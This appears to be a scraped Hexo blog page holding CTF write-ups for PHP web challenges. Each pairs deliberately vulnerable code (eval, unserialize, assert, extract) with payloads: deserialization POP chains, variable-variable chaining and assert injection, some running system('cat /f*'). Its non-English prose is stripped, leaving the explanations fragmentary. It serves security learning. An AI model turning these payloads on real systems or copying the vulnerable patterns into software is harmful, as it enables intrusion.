class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p>?_GET&#x3D;flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var_dump($_GET);=&gt;  var_dump($flag);</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<p>wpphp</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=0&amp;b=0&amp;c=0&amp;d=0&amp;e=999999999999999999&amp;submit=%E5%8D%B7%E4%BA%86%E5%B0%B1%E8%B7%91%EF%BC%81</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">include &quot;flag.php&quot;;</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">class Moon&#123;</span><br><span class=\"line\">    public $name=&quot;&quot;;</span><br><span class=\"line\">    public function __toString()&#123;</span><br><span class=\"line\">        return $this-&gt;name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    public function __wakeup()&#123;</span><br><span class=\"line\">        echo &quot;&quot;.$this-&gt;name.&quot;&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class Ion_Fan_Princess&#123;</span><br><span class=\"line\">    public $nickname=&quot;&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function call()&#123;</span><br><span class=\"line\">        global $flag;</span><br><span class=\"line\">        if ($this-&gt;nickname==&quot;&quot;)&#123;</span><br><span class=\"line\">            echo $flag;</span><br><span class=\"line\">        &#125;else&#123;</span><br><span class=\"line\">            echo &quot;&quot;.$this-&gt;nickname.&quot;\\n&quot;;</span><br><span class=\"line\">            echo &quot;?!\\n&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    public function __toString()&#123;</span><br><span class=\"line\">        $this-&gt;call();</span><br><span class=\"line\">        return &quot;\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t----&quot;.$this-&gt;nickname;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if (isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class=\"line\">    unserialize($_GET[&#x27;code&#x27;]);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    $a=new Ion_Fan_Princess();</span><br><span class=\"line\">    echo $a;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>Ion_Fan_Princess call echo $flag</p>\n<p>Ion_Fan_Princess__toStringcall</p>\n<p>Moon  __wakeup ____toString</p>\n<p>pop</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Moon::__wakeup =&gt; Ion_Fan_Princess::__toString =&gt; Ion_Fan_Princess::call</span><br></pre></td></tr></table></figure>\n\n\n\n<p>exp</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">class Moon&#123;</span><br><span class=\"line\">    public $name;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class Ion_Fan_Princess&#123;</span><br><span class=\"line\">    public $nickname=&quot;&quot;;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a=new Moon;</span><br><span class=\"line\">$b=new Ion_Fan_Princess;</span><br><span class=\"line\">$a-&gt;name=$b;</span><br><span class=\"line\"></span><br><span class=\"line\">echo serialize($a);</span><br><span class=\"line\">//  &lt;?php</span><br><span class=\"line\">class Moon&#123;</span><br><span class=\"line\">    public $name;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class Ion_Fan_Princess&#123;</span><br><span class=\"line\">    public $nickname=&quot;&quot;;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a=new Moon;</span><br><span class=\"line\">$b=new Ion_Fan_Princess;</span><br><span class=\"line\">$a-&gt;name=$b;</span><br><span class=\"line\"></span><br><span class=\"line\">echo serialize($a);</span><br><span class=\"line\">// O:4:&quot;Moon&quot;:1:&#123;s:4:&quot;name&quot;;O:16:&quot;Ion_Fan_Princess&quot;:1:&#123;s:8:&quot;nickname&quot;;s:9:&quot;&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?code=O:4:&quot;Moon&quot;:1:&#123;s:4:&quot;name&quot;;O:16:&quot;Ion_Fan_Princess&quot;:1:&#123;s:8:&quot;nickname&quot;;s:9:&quot;&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"CTFSHOW-\"><a href=\"#CTFSHOW-\" class=\"headerlink\" title=\"CTFSHOW_\"></a>CTFSHOW_</h1><h2 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">eval</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"variable\">$_GET</span>[<span class=\"variable\">$_POST</span>[<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;CTFshow-QQ:&#x27;</span>]]]][<span class=\"number\">6</span>][<span class=\"number\">0</span>][<span class=\"number\">7</span>][<span class=\"number\">5</span>][<span class=\"number\">8</span>][<span class=\"number\">0</span>][<span class=\"number\">9</span>][<span class=\"number\">4</span>][<span class=\"number\">4</span>]);</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p><strong>$_COOKIE[CTFshow-QQ:]</strong></p>\n<p><strong>cookie</strong>**CTFshow-QQ:**a</p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_REQUEST[$_GET[$_POST[a]]]</span><br></pre></td></tr></table></figure>\n\n<p>posta&#x3D;b</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_REQUEST[$_GET[b]]</span><br></pre></td></tr></table></figure>\n\n<p>getb&#x3D;c</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_REQUEST[c][6][0][7][5][8][0][9][4][4]);</span><br></pre></td></tr></table></figure>\n\n<p>REQUESTgetpost</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c[6][0][7][5][8][0][9][4][4]=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure>\n\n<p>cookie**<u>CTFshow-QQ:</u>**</p>\n<p>url</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CTFshow-QQ%E7%BE%A4:=a</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"web2-c0me-t0-s1gn\"><a href=\"#web2-c0me-t0-s1gn\" class=\"headerlink\" title=\"web2 c0me_t0_s1gn\"></a>web2 c0me_t0_s1gn</h2><p>F12</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151445898.png\"\n                        alt=\"-1680664313075\"\n                 ></p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">try to run the function &quot;g1ve_flag()&quot; to get the flag!</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151445782.png\"\n                        alt=\"-1680664326857\"\n                 ></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"$\"></a>$</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">extract</span>(<span class=\"variable\">$_POST</span>);</span><br><span class=\"line\"><span class=\"keyword\">eval</span>(<span class=\"variable\">$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br></pre></td></tr></table></figure>\n\n<p>$_$__&#x3D;a,a36$36</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\">s = string.ascii_letters </span><br><span class=\"line\">t=<span class=\"string\">&#x27;_=a&amp;&#x27;</span></span><br><span class=\"line\">code=<span class=\"string\">&quot;phpinfo();&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">35</span>):</span><br><span class=\"line\">    t+=s[i]+<span class=\"string\">&quot;=&quot;</span>+s[i+<span class=\"number\">1</span>]+<span class=\"string\">&#x27;&amp;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">t+=s[i]+<span class=\"string\">&#x27;=&#x27;</span>+code</span><br><span class=\"line\"><span class=\"built_in\">print</span>(t)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_=a&amp;a=b&amp;b=c&amp;c=d&amp;d=e&amp;e=f&amp;f=g&amp;g=h&amp;h=i&amp;i=j&amp;j=k&amp;k=l&amp;l=m&amp;m=n&amp;n=o&amp;o=p&amp;p=q&amp;q=r&amp;r=s&amp;s=t&amp;t=u&amp;u=v&amp;v=w&amp;w=x&amp;x=y&amp;y=z&amp;z=A&amp;A=B&amp;B=C&amp;C=D&amp;D=E&amp;E=F&amp;F=G&amp;G=H&amp;H=I&amp;I=J&amp;I=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">highlight_file(__FILE__); </span><br><span class=\"line\">include &quot;flag.php&quot;;  </span><br><span class=\"line\">if (isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class=\"line\">    if ($_GET[&#x27;num&#x27;] == 114514)&#123;</span><br><span class=\"line\">        assert(&quot;intval($_GET[num])==1919810&quot;) or die(&quot;!&quot;);</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>assertphpeval</p>\n</blockquote>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=114514);//      </span><br><span class=\"line\"></span><br><span class=\"line\">?num=114514%2b1805296     %2burl1919810</span><br><span class=\"line\"></span><br><span class=\"line\">?num=114514);1919810    </span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;flag.php&quot;</span>;  </span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;num&#x27;</span>]))&#123;</span><br><span class=\"line\">     <span class=\"keyword\">if</span> (<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;num&#x27;</span>] == <span class=\"number\">114514</span> &amp;&amp; <span class=\"title function_ invoke__\">check</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;num&#x27;</span>]))&#123;</span><br><span class=\"line\">              <span class=\"title function_ invoke__\">assert</span>(<span class=\"string\">&quot;intval(<span class=\"subst\">$_GET</span>[num])==1919810&quot;</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>(<span class=\"string\">&quot;!&quot;</span>);</span><br><span class=\"line\">              <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">     &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check</span>(<span class=\"params\"><span class=\"variable\">$str</span></span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> !<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/[a-z]|\\;|\\(|\\)/&quot;</span>,<span class=\"variable\">$str</span>);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>%2b</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=114514%2b1805296</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"TapTapTap\"><a href=\"#TapTapTap\" class=\"headerlink\" title=\"TapTapTap\"></a>TapTapTap</h2><p>F12flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/secret_path_you_do_not_know/secretfile.txt</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"webshell\"><a href=\"#webshell\" class=\"headerlink\" title=\"webshell\"></a>webshell</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">    <span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Webshell</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"variable\">$cmd</span> = <span class=\"string\">&#x27;echo &quot;Hello World!&quot;&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">init</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">init</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/flag/i&#x27;</span>, <span class=\"variable\">$this</span>-&gt;cmd)) &#123;</span><br><span class=\"line\">                <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">exec</span>(<span class=\"variable\">$this</span>-&gt;cmd);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">exec</span>(<span class=\"params\"><span class=\"variable\">$cmd</span></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">shell_exec</span>(<span class=\"variable\">$cmd</span>);</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable\">$result</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$serializecmd</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$unserializecmd</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$serializecmd</span>);</span><br><span class=\"line\">        <span class=\"variable\">$unserializecmd</span>-&gt;<span class=\"title function_ invoke__\">init</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p>webshellinit</p>\n<p>exp</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Webshell</span> </span>&#123;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"variable\">$cmd</span> = <span class=\"string\">&#x27;cat f*&#x27;</span>;</span><br><span class=\"line\">        </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">Webshell</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br><span class=\"line\"><span class=\"comment\">// O:8:&quot;Webshell&quot;:1:&#123;s:3:&quot;cmd&quot;;s:6:&quot;cat f*&quot;;&#125; </span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include &quot;flag.php&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">$result=&#x27;&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">for ($i=1;$i&lt;=count($_GET);$i++)&#123;</span><br><span class=\"line\">    if (strlen($_GET[$i])&gt;1)&#123;</span><br><span class=\"line\">        die(&quot;&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    else&#123;</span><br><span class=\"line\">    $result=$result.$_GET[$i];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if ($result ===&quot;&quot;)&#123;</span><br><span class=\"line\">    echo $flag;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>php3url3</p>\n<p>url</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%E5%A4%A7%E7%89%9B</span><br></pre></td></tr></table></figure>\n\n\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/?1=%E5&amp;2=%A4&amp;3=%A7&amp;4=%E7&amp;5=%89&amp;6=%9B</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">include &quot;flag.php&quot;;</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">if (isset($_GET[&#x27;0&#x27;]))&#123;</span><br><span class=\"line\">    $arr[$_GET[&#x27;0&#x27;]]=1;</span><br><span class=\"line\">    if ($arr[]=1)&#123;</span><br><span class=\"line\">        die($flag);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else&#123;</span><br><span class=\"line\">        die(&quot;nonono!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>78$arr[]&#x3D;1ifturedieflag0</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?0=0</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 